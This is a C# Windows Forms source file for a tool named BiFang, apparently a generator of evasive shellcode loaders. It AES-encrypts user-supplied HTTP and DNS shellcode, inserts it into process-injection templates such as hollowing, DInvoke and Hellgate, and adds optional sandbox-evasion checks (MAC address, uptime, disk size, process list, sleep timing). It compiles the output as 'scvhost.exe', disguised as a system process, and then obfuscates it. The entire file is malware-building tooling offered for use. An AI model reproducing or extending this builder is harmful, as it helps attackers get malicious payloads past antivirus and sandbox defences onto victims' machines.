using BiFang.until;
using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace BiFang
{
    public partial class MainForm : Form
    {
        public static Dictionary<string, Sandbox> sandboxes = new Dictionary<string, Sandbox>
        {
            {"StartTime" ,new Sandbox(){UIName="StartTime",Path=Application.StartupPath + "\\template\\sandbox\\CheckStartTime.tpl",Methmod="CheckStartTime",MethmodRun="CheckStartTime();" } },
            {"CPULang" , new Sandbox(){UIName="CPULang",Path=Application.StartupPath + "\\template\\sandbox\\CheckCPUlMemoryLang.tpl",Methmod="CheckCPUlMemoryLang",MethmodRun="CheckCPUlMemoryLang();"} },
            {"Disk" ,new Sandbox(){UIName="Disk",Path=Application.StartupPath + "\\template\\sandbox\\CheckHardDiskSpace.tpl",Methmod="CheckHardDiskSpace",MethmodRun="CheckHardDiskSpace();"} },
            {"Process" ,new Sandbox(){UIName="Process",Path=Application.StartupPath + "\\template\\sandbox\\CheckProcess.tpl",Methmod="CheckProcess",MethmodRun="CheckProcess();"} },
            {"MAC" ,new Sandbox(){UIName="MAC",Path=Application.StartupPath + "\\template\\sandbox\\CheckMACAddress.tpl",Methmod="CheckMACAddress",MethmodRun="CheckMACAddress();"} },
            {"SLEEP" ,new Sandbox(){UIName="SLEEP",Path=Application.StartupPath + "\\template\\sandbox\\ChecksleepAcceleration.tpl",Methmod="ChecksleepAcceleration",MethmodRun="ChecksleepAcceleration();"} }
        };

        public static Dictionary<string, List<Teach>> net2teach = new Dictionary<string, List<Teach>>()
        {
            {"net4",new List<Teach>()
                {
                    new Teach(){DisplayName="Hollwing",Path=Application.StartupPath + "\\template\\tech\\HW.tpl"},
                         new Teach(){DisplayName="DInvoke",Path=Application.StartupPath + "\\template\\tech\\DInvoke.tpl"},
                          new Teach(){DisplayName="Mapping Injection",Path=Application.StartupPath + "\\template\\tech\\Mapping.tpl"},
                            new Teach(){DisplayName="New NTDL",Path=Application.StartupPath + "\\template\\tech\\NewntdlHK.tpl"},
                            new Teach(){DisplayName="Hellgate",Path=Application.StartupPath + "\\template\\tech\\Hellgate.tpl"},
                }
            },
            {"net3",new List<Teach>()
                {
                }
            },
        };

        public MainForm()
        {
            InitializeComponent();

            //初始化数据
        }

        private void uiButton1_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog
            {
                InitialDirectory = "c:\\",
                Filter = "Binary Files (*.bin)|*.bin",
                RestoreDirectory = true
            };
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                this.uiTextBox1.Text = openFileDialog.FileName;
                Log(" HTTP bin上传成功，路径如下：" + openFileDialog.FileName);
            }
        }

        private void uiButton2_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog
            {
                InitialDirectory = "c:\\",
                Filter = "Binary Files (*.bin)|*.bin",
                RestoreDirectory = true
            };
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                this.uiTextBox2.Text = openFileDialog.FileName;
                Log(" DNS bin上传成功，路径如下：" + openFileDialog.FileName);
            }
        }

        private void Log(string text)
        {
            this.uiRichTextBox1.Text += "\n" + text;
        }

        private void uiButton3_Click(object sender, EventArgs e)
        {
            CompileCfg compileCfg = new CompileCfg();
            string salte = GetRandomString(8);
            string key = uiTextBox3.Text == "" ? "hi@2077" : uiTextBox3.Text;
            string httpRaw = uiTextBox1.Text != "" ? ReadFile(uiTextBox1.Text, "http shellcode：", 1, key, salte) : "";
            string dnsRaw = uiTextBox2.Text != "" ? ReadFile(uiTextBox2.Text, "dns shellcode：", 1, key, salte) : "";
            compileCfg.SourceCode = ReadFile(uiComboBox1.SelectedValue.ToString(), "注入模板：");
            compileCfg.Key = key;
            compileCfg.Salt = salte;
            compileCfg.HTTPRaw = httpRaw;
            compileCfg.DNSRaw = dnsRaw;
            bool flag = CompileCode(compileCfg);
            string basePath = AppDomain.CurrentDomain.BaseDirectory + "\\scvhost.exe";
            if (flag && File.Exists(basePath))
            {
                bool className = uiCheckBox7.Checked;
                bool Method = uiCheckBox8.Checked;
                bool Variable = uiCheckBox9.Checked;
                string outPth = AppDomain.CurrentDomain.BaseDirectory + "\\scvhost.obfuscate.exe";
                Obfuscate.Run(basePath, outPth, className, Method, Variable);
                if (File.Exists(outPth))
                {
                    Log($"混淆成功,路径：{outPth}");
                }
            }
        }

        /// <summary>
        /// 读取文件
        /// </summary>
        /// <param name="path"></param>
        /// <param name="readType">0 txt读取 1 shellcode读取</param>
        /// <param name="keys"></param>
        /// <param name="salte"></param>
        /// <returns></returns>
        private string ReadFile(string path, string logName = "", int readType = 0, string keys = "hi@2020", string salte = "1qaz2wsx")
        {
            if (readType == 0)
            {
                StreamReader sr = new StreamReader(path);
                string text = sr.ReadToEnd();
                sr.Close();
                Log($"{logName} 读取成功");
                return text;
            }
            else
            {
                byte[] raw = System.IO.File.ReadAllBytes(path);
                string rawstr = Crypto.AES_Encrypt(raw, keys, salte);
                Log($"{logName} 读取成功");
                return rawstr;
            }
        }

        public string GetRandomString(int length)
        {
            byte[] b = new byte[4];
            new System.Security.Cryptography.RNGCryptoServiceProvider().GetBytes(b);
            Random r = new Random(BitConverter.ToInt32(b, 0));
            string s = null;
            string str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
            for (int i = 0; i < length; i++)
            {
                s += str.Substring(r.Next(0, str.Length - 1), 1);
            }
            return s;
        }

        public bool CompileCode(CompileCfg cfg, int NETVersion = 4, int platform = 64)
        {
            Dictionary<string, string> options = new Dictionary<string, string>();
            if (NETVersion == 4)
            {
                options.Add("CompilerVersion", "v4.0");
            }
            else
            {
                options.Add("CompilerVersion", "v3.5");
            }
            CSharpCodeProvider provider = new CSharpCodeProvider(options);
            CompilerParameters parameters = new CompilerParameters
            {
                GenerateExecutable = true,
                GenerateInMemory = false,
            };
            parameters.CompilerOptions += (platform == 32) ? " -platform:x86" : " -platform:x64";
            parameters.CompilerOptions += " -unsafe";
            parameters.CompilerOptions += " /target:winexe -optimize";
            string path = cfg.Outpath;
            parameters.OutputAssembly = path;

            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");
            parameters.WarningLevel = 3;
            string src = cfg.SourceCode;
            src = src.Replace("{{keyText}}", cfg.Key);
            src = src.Replace("{{Salt}}", cfg.Salt);
            src = src.Replace("{{context1}}", cfg.HTTPRaw);
            src = src.Replace("{{context2}}", cfg.DNSRaw);
            if (uiCheckBox1.Checked == true)
            {
                src = src.Replace("{{CheckProcess}}", ReadFile(sandboxes["Process"].Path, "sandbox_CheckProcess:"));
                src = src.Replace("{{CheckProcess_RUN}}", sandboxes["Process"].MethmodRun);
            }
            else
            {
                src = src.Replace("{{CheckProcess}}", "");
                src = src.Replace("{{CheckProcess_RUN}}", "");
            }
            if (uiCheckBox2.Checked == true)
            {
                src = src.Replace("{{CheckMACAddress}}", ReadFile(sandboxes["MAC"].Path, "sandbox_CheckMACAddress"));
                src = src.Replace("{{CheckMACAddress_RUN}}", sandboxes["MAC"].MethmodRun);
            }
            else
            {
                src = src.Replace("{{CheckMACAddress}}", "");
                src = src.Replace("{{CheckMACAddress_RUN}}", "");
            }
            if (uiCheckBox3.Checked == true)
            {
                src = src.Replace("{{CheckStartTime}}", ReadFile(sandboxes["StartTime"].Path, "sandbox_CheckStartTime"));
                src = src.Replace("{{CheckStartTime_RUN}}", sandboxes["StartTime"].MethmodRun);
            }
            else
            {
                src = src.Replace("{{CheckStartTime}}", "");
                src = src.Replace("{{CheckStartTime_RUN}}", "");
            }
            if (uiCheckBox4.Checked == true)
            {
                src = src.Replace("{{CheckHardDiskSpace}}", ReadFile(sandboxes["Disk"].Path, "sandbox_CheckHardDiskSpace"));
                src = src.Replace("{{CheckHardDiskSpace_RUN}}", sandboxes["Disk"].MethmodRun);
            }
            else
            {
                src = src.Replace("{{CheckHardDiskSpace}}", "");
                src = src.Replace("{{CheckHardDiskSpace_RUN}}", "");
            }
            if (uiCheckBox5.Checked == true)
            {
                src = src.Replace("{{CheckCPUlMemoryLang}}", ReadFile(sandboxes["CPULang"].Path, "sandbox_CheckCPUlMemoryLang"));
                src = src.Replace("{{CheckCPUlMemoryLang_RUN}}", sandboxes["CPULang"].MethmodRun);
            }
            else
            {
                src = src.Replace("{{CheckCPUlMemoryLang}}", "");
                src = src.Replace("{{CheckCPUlMemoryLang_RUN}}", "");
            }
            if (uiCheckBox6.Checked == true)
            {
                src = src.Replace("{{ChecksleepAcceleration}}", ReadFile(sandboxes["SLEEP"].Path, "sandbox_ChecksleepAcceleration"));
                src = src.Replace("{{ChecksleepAcceleration_RUN}}", sandboxes["SLEEP"].MethmodRun);
            }
            else
            {
                src = src.Replace("{{ChecksleepAcceleration}}", "");
                src = src.Replace("{{ChecksleepAcceleration_RUN}}", "");
            }
            CompilerResults results = provider.CompileAssemblyFromSource(parameters, src);
            StringBuilder sb = new StringBuilder();
            if (results.Errors.HasErrors)
            {
                foreach (CompilerError error in results.Errors)
                {
                    sb.Append(error.ErrorText + " \n ");
                }
            }
            if (sb.ToString() == "")
            {
                return true;
            }
            else
            {
                Log("编译错误：\n" + sb.ToString());
                return false;
            }
        }

        private class Tech
        {
            public string DisplayName { get; set; }
            public string Methmod { get; set; }
            public string Patch { get; set; }
        }

        private void uiRadioButton2_CheckedChanged(object sender, EventArgs e)
        {
            if (uiRadioButton2.Checked == true)
            {
                uiComboBox1.DataSource = net2teach["net4"];
                uiComboBox1.DisplayMember = "DisplayName";
                uiComboBox1.ValueMember = "Path";
                Log(".NET 编译版本 >=4.0");
            }
        }

        private void uiRadioButton1_CheckedChanged(object sender, EventArgs e)
        {
            if (uiRadioButton1.Checked == true)
            {
                uiComboBox1.DataSource = net2teach["net3"];
                uiComboBox1.DisplayMember = "DisplayName";
                uiComboBox1.ValueMember = "Path";
                Log(".NET 编译版本 <=3.5");
            }
        }
    }
}